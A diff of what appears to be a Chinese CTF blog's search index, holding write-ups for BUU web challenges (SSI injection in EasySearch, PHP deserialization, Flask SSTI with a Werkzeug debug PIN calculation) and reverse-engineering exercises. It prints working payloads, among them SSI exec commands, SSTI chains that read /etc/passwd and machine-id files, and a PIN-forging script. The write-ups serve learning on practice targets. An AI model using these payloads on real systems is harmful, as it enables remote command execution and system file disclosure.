+<h4 id="3-shtml"><a href="#3-shtml" class="headerlink" title="3.shtml"></a>3.shtml</h4><p>后缀名是.shtml，和html一样都是网页文件。不同在于：</p>
+<p>-&gt;shtml文件中有<strong>服务器端包含（server-side includes, SSI）指令</strong></p>
+<p>-&gt;shtml文件在发送到客户端前，会经过服务器进行处理 — <strong>将shtml文件中的SSI指令解释</strong></p>
+<p>-&gt;最终返回给客户端的是<strong>解释过后的shtml文件内容</strong></p>
+<p><strong>SSI指令格式</strong></p>
+<p><code>&lt;!--#include virtual=&quot;文件名字&quot;--&gt;</code></p>
+<p><code>&lt;!--#include file=&quot;文件名字&quot;--&gt; </code> </p>
+<p>-&gt;<code>#include</code>在html文件中引入另一个文件的内容</p>
+<p>-&gt; file 是相对于本文档的位置      virtual 是相对于服务器根目录的位置</p>
+<p><code>&lt;!--#echo var=&quot;变量名称&quot;--&gt;</code> </p>
+<p>-&gt;<code>#echo</code>将 变量或代码 插入到页面中</p>
+<p><strong>注意：&lt;!–与#号间无空格，只有SSI指令与参数间存在空格，SSI指令是大小写敏感的。</strong></p>
+<p><strong>注意：服务器必须配置为支持SSI功能。SHTML文件可能需要在服务器上启用SSI才能发挥作用。</strong></p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>根据题目名 EasySearch 选择用dirsearch扫描目录，不过我自己什么都没扫出来，看Wp说是 index.php.swp，需要自己将这个添加到字典中，才可以扫出来</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/00.png"></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;    </span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>1.get_hash函数</p>
+<p>-&gt;$chars是大小写字母+数字+一些特殊符号，$random是$chars中五个随机字符，$content是一段唯一字符串+$random</p>
+<p>-&gt;返回是经过sha1加密的字符串</p>
+<p>2.if else语句可以发现</p>
+<p>-&gt;如果满足$admin &#x3D;&#x3D; substr(md5($_POST[‘password’]),0,6) 会进入if语句  否则直接输出 [!] Failed</p>
+<p>-&gt;显然要满足 脚本编写（跟Wp写的，自己学习一下）</p>
+<p>3.进入if语句之后，会向$shtml中写入$text的内容</p>
+</blockquote>
+<p>首先要通过脚本找到满足if的条件</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></div>
+
+<p>成功进入</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/01.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/02.png"></p>
+<p>输出了 [!] Header error …</p>
+<p>我们是向一个文件中写入了内容，并且我们了解到了shtml的知识，很明显，我们要找到这个写入内容的shtml文件的目录，从而访问</p>
+<p>最后在F12网络中可以找到</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/03.png"></p>
+<p>访问之后</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/04.png" alt="04"></p>
+<p>得到$username就是我们的执行点 再根据shtml的知识，通过SSI指令来控制内容</p>
+<p><code>&lt;!--#exec cmd=&quot;ls&quot;-&gt;</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/05.png"></p>
+<p>查看当前目录并没有什么收获，但我们当前目录是 public 所以我们查看上一级目录</p>
+<p><code>&lt;!--#exec cmd=&quot;ls ../&quot;-&gt;</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/06.png"></p>
+<p>直接访问</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/07.png"></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Buu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUU-easy_serialize_php的Wp</title>
     <url>/CTF/Web/BUU-easy_serialize_php/</url>
     <content><![CDATA[<blockquote>
@@ -1363,71 +1275,6 @@
 <p><code>&quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</code></p>
 <p><code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> -&gt;这是23的长度，我们传入function中的值，开始要有一个”和; 来闭合前面user的值</p>
 <p><strong>payload:_SESSION[user]&#x3D;flagflagflagflagflagphp&amp;_SESSION[function]&#x3D;”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:1:”1”;s:1:”2”;}</strong></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>Buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUU-[GYCTF2020]FlaskApp的Wp</title>
-    <url>/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/</url>
-    <content><![CDATA[<h2 id="GYCTF2020-FlaskApp的Wp"><a href="#GYCTF2020-FlaskApp的Wp" class="headerlink" title="[GYCTF2020]FlaskApp的Wp"></a>[GYCTF2020]FlaskApp的Wp</h2><p><strong>计算PIN码的方法（必须知道的值）：</strong></p>
-<blockquote>
-<ol>
-<li>username：就是启动这个flask的用户</li>
-</ol>
-<p>-&gt; <code>etc/passwd</code> 中查看</p>
-<ol start="2">
-<li><p>modname：一般为flask.py</p>
-</li>
-<li><p>getattr(app, “__name__”, app.<strong>class</strong>.<strong>name</strong>)：python该值一般为Flask 值一般不变</p>
-</li>
-<li><p>getattr(mod, ‘file’, None)：为flask目录下的一个app.py的绝对路径（通过报错信息一般回泄露该路径）</p>
-</li>
-<li><p>uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</p>
-</li>
-</ol>
-<p>-&gt; 通过文件 <code>/sys/class/net/eth0/address</code>获取     # eth0 处为当前使用的网卡</p>
-<ol start="6">
-<li>get_machine_id() ：&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值</li>
-</ol>
-<p>-&gt;假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值</p>
-<p>-&gt;假如是Docker机 那么为 &#x2F;proc&#x2F;self&#x2F;cgroup</p>
-</blockquote>
-<p>python shell的一些命令(os 模块)</p>
-<p>import os</p>
-<p>查看当前目录所有文件 <code>os.listdir(&#39;.&#39;)</code></p>
-<p>查看当前目录<code>os.getcwd()</code></p>
-<p>更改目录<code>os.chdir()</code></p>
-<p>打开文件<code>os.popen(&#39;cat filepath&#39;).read()</code></p>
-<p>打开文件<code>exec(open(&#39;filepath&#39;).read())</code> 好像会报错，但是报错中有文件内容</p>
-<p><strong>解题：</strong></p>
-<p>题目是FlaskAPP，打开网址，有提示.</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/03.png"></p>
-<p>获取到的信息：Flask 和 PIN（根据要获得PIN的需要知道的数值） -&gt; 读取文件 -&gt;SSTI（Flask）注入读取文件</p>
-<p><strong>SSTI</strong> 要寻找注入点-&gt; 先经过base64加密之后 再进行base64解码 （注入点在base64解码那里）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/04.png"></p>
-<p><strong>Payload：</strong></p>
-<p><strong>1.获取username</strong></p>
-<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/passwd').read()&#125;&#125;</code></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/00.png"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/01.png"></p>
-<p>2.获取Mac地址（同上, 转成十进制）</p>
-<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/sys/class/net/eth0/address').read()&#125;&#125;</code></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/02.png"></p>
-<p><strong>3.获取机器ID（不止这第一个路径，还有几个其他的，都要试试，我的是这个得到了正确答案）</strong></p>
-<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/machine-id').read()&#125;&#125;</code></p>
-<p><strong>获取PIN的脚本（网上找的）</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;11296411583006&#x27;</span><span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>, <span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure></div>
-
-
-
-<hr>
-<p>参考：<a class="link" href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -1710,6 +1557,159 @@
       <tags>
         <tag>Web</tag>
         <tag>漏洞学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU-[GYCTF2020]FlaskApp的Wp</title>
+    <url>/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/</url>
+    <content><![CDATA[<h2 id="GYCTF2020-FlaskApp的Wp"><a href="#GYCTF2020-FlaskApp的Wp" class="headerlink" title="[GYCTF2020]FlaskApp的Wp"></a>[GYCTF2020]FlaskApp的Wp</h2><p><strong>计算PIN码的方法（必须知道的值）：</strong></p>
+<blockquote>
+<ol>
+<li>username：就是启动这个flask的用户</li>
+</ol>
+<p>-&gt; <code>etc/passwd</code> 中查看</p>
+<ol start="2">
+<li><p>modname：一般为flask.py</p>
+</li>
+<li><p>getattr(app, “__name__”, app.<strong>class</strong>.<strong>name</strong>)：python该值一般为Flask 值一般不变</p>
+</li>
+<li><p>getattr(mod, ‘file’, None)：为flask目录下的一个app.py的绝对路径（通过报错信息一般回泄露该路径）</p>
+</li>
+<li><p>uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</p>
+</li>
+</ol>
+<p>-&gt; 通过文件 <code>/sys/class/net/eth0/address</code>获取     # eth0 处为当前使用的网卡</p>
+<ol start="6">
+<li>get_machine_id() ：&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值</li>
+</ol>
+<p>-&gt;假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值</p>
+<p>-&gt;假如是Docker机 那么为 &#x2F;proc&#x2F;self&#x2F;cgroup</p>
+</blockquote>
+<p>python shell的一些命令(os 模块)</p>
+<p>import os</p>
+<p>查看当前目录所有文件 <code>os.listdir(&#39;.&#39;)</code></p>
+<p>查看当前目录<code>os.getcwd()</code></p>
+<p>更改目录<code>os.chdir()</code></p>
+<p>打开文件<code>os.popen(&#39;cat filepath&#39;).read()</code></p>
+<p>打开文件<code>exec(open(&#39;filepath&#39;).read())</code> 好像会报错，但是报错中有文件内容</p>
+<p><strong>解题：</strong></p>
+<p>题目是FlaskAPP，打开网址，有提示.</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/03.png"></p>
+<p>获取到的信息：Flask 和 PIN（根据要获得PIN的需要知道的数值） -&gt; 读取文件 -&gt;SSTI（Flask）注入读取文件</p>
+<p><strong>SSTI</strong> 要寻找注入点-&gt; 先经过base64加密之后 再进行base64解码 （注入点在base64解码那里）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/04.png"></p>
+<p><strong>Payload：</strong></p>
+<p><strong>1.获取username</strong></p>
+<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/passwd').read()&#125;&#125;</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/00.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/01.png"></p>
+<p>2.获取Mac地址（同上, 转成十进制）</p>
+<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/sys/class/net/eth0/address').read()&#125;&#125;</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/02.png"></p>
+<p><strong>3.获取机器ID（不止这第一个路径，还有几个其他的，都要试试，我的是这个得到了正确答案）</strong></p>
+<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/machine-id').read()&#125;&#125;</code></p>
+<p><strong>获取PIN的脚本（网上找的）</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;11296411583006&#x27;</span><span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>, <span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<hr>
+<p>参考：<a class="link" href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Re刷题记录</title>
+    <url>/CTF/Re/Re%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h2 id="Buu-新年快乐-初用upx"><a href="#Buu-新年快乐-初用upx" class="headerlink" title="Buu - 新年快乐 [ 初用upx ]"></a>Buu - 新年快乐 [ 初用upx ]</h2><p>32位有壳</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-00.png"></p>
+<blockquote>
+<p>加壳 upx.exe filename</p>
+<p>脱壳 upx.exe -d filename</p>
+</blockquote>
+<p><strong>在upx目录下打开终端，将软件放在相同目录（或者直接给出绝对路径）</strong></p>
+<p>脱完壳之后用32位ida打开，进入main函数，</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-01.png"></p>
+<p>str2就是flag</p>
+<h2 id="Buu-xor-ida运用"><a href="#Buu-xor-ida运用" class="headerlink" title="Buu - xor [ ida运用 ]"></a>Buu - xor [ ida运用 ]</h2><p>查壳，无壳，拖进64位ida（我是在linux中file命令看的位）</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-00.png"></p>
+<blockquote>
+<p>这是main函数，先看到</p>
+<p> if ( !strncmp(__b, global, 33uLL) )<br>    printf(“Success”);</p>
+<p>要success &#x3D;&gt; __b &#x3D;&#x3D; global 前33位相等</p>
+</blockquote>
+<blockquote>
+<p>全部分析一遍，先给__b 256字节置0 -&gt; 调用get_line函数 -&gt; 输入__b -&gt; __b字符串的长度只能是33 -&gt; 然后是for循环，一个异或</p>
+<p>-&gt; 最后比较，前33位要相等</p>
+</blockquote>
+<p><strong>Result</strong>： global[i] &#x3D; b[i] ^ b[i-1]，我们要求的是__b的值（前面的printf语句，input your flag），可以看出长度为33（如果不是33，直接goto LABEL_7 &#x3D;&gt; return语句）</p>
+<p><strong>Skill</strong>：点击global查看它的值，跳转到上面这个图中，看到灰色的部分（我奇怪的是，与Wp中看到的值不一样，我就随便双击了一下灰色部分，发现依然可以跳转），然后就来到了下面这个图的部分</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-01.png"></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shift + e =&gt; 提取数组中的字符</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-02.png" alt="4-5-02"></p>
+<p>脚本异或一下得到__b的值</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">data = [</span><br><span class="line">  <span class="number">102</span>,  <span class="number">10</span>, <span class="number">107</span>,  <span class="number">12</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">79</span>,  <span class="number">46</span>,  <span class="number">64</span>,  <span class="number">17</span>,</span><br><span class="line">  <span class="number">120</span>,  <span class="number">13</span>,  <span class="number">90</span>,  <span class="number">59</span>,  <span class="number">85</span>,  <span class="number">17</span>, <span class="number">112</span>,  <span class="number">25</span>,  <span class="number">70</span>,  <span class="number">31</span>,</span><br><span class="line">  <span class="number">118</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">35</span>,  <span class="number">68</span>,  <span class="number">14</span>, <span class="number">103</span>,   <span class="number">6</span>, <span class="number">104</span>,  <span class="number">15</span>,</span><br><span class="line">   <span class="number">71</span>,  <span class="number">50</span>,  <span class="number">79</span>,  <span class="number">0</span></span><br><span class="line">]</span><br><span class="line">x = <span class="string">&quot;f&quot;</span>  <span class="comment"># for循环是从1开始的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">    x += <span class="built_in">chr</span>(data[i]^data[i-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Buu-reverse3-base64加密函数"><a href="#Buu-reverse3-base64加密函数" class="headerlink" title="Buu - reverse3 [ base64加密函数 ]"></a>Buu - reverse3 [ base64加密函数 ]</h2><p>32位无壳，拖进ida32位中，找到main_0函数</p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-03.png"></p>
+<p>输入字符串 Str -&gt; 经过sub_4110BE函数之后赋值给v4 -&gt; 将v4前40位字符给Destination -&gt; 遍历Destination字符串 每一个加上下表-&gt; 比较Destination 和 Str2是否相同</p>
+<blockquote>
+<p>sub_4110BE函数</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-04.png"></p>
+<p>-&gt; 下面这是一个base64加密的过程（Wp）</p>
